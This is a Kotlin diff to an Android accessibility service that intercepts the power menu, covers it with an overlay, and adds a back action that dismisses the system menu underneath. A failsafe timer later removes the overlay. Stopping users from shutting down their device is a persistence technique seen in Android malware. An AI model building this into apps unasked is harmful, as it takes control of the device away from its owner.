@@ -213,6 +213,10 @@ class MyAccessibilityService : AccessibilityService() {
                                     DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
                                     DebugLogger.log("POWER_SHIELD", "Power Menu Intercepted. Failsafe: ${timeout}s")
                                     
+                                    // Drop the system menu running behind our overlay
+                                    delay(100)
+                                    performGlobalAction(GLOBAL_ACTION_BACK)
+                                    
                                     // Failsafe Auto-Remove
                                     Handler(Looper.getMainLooper()).postDelayed({
                                         DynamicUIManager.removeOverlay(this@MyAccessibilityService)
